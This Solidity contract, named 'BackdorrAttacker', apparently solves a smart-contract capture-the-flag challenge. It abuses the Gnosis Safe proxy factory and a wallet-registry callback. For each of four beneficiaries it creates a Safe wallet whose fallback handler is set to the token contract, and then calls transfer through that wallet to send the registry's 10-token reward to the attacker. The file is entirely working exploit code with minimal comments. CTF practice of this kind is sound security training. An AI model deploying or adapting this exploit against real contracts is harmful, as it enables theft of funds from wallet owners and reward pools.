// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import "@openzeppelin/contracts/interfaces/IERC20.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (address proxy);
}

contract BackdorrAttacker {
    IGnosisSafeProxyFactory private immutable factory;
    IProxyCreationCallback private immutable walletRegistry;
    address private immutable singleton;
    address private immutable token;
    address private immutable owner;
    uint256 private constant TOKEN_PAYMENT = 10 ether;

    constructor(
        IGnosisSafeProxyFactory _factory, 
        IProxyCreationCallback _walletRegistry,
        address _singleton,
        address _token
    ) 
    {
        factory = _factory;
        walletRegistry = _walletRegistry;
        singleton = _singleton;
        token = _token;
        owner = msg.sender;
    }

    function attack(address[4] calldata users) external {
        require(msg.sender == owner, "only owner");

        // create wallet for the beneficiaries while setting fallback handler to the token
        address[] memory owners = new address[](1);
        for(uint256 i =0;i<users.length;i++){
            owners[0] = users[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, 
                owners, 1, address(0), new bytes(0), token, address(0), 0, address(0)
            );
            address wallet = factory.createProxyWithCallback(
                singleton,
                initializer,
                i,
                walletRegistry
            );
            // transfer through fallback handler
            IERC20(wallet).transfer(owner, TOKEN_PAYMENT);
        }
    }
}
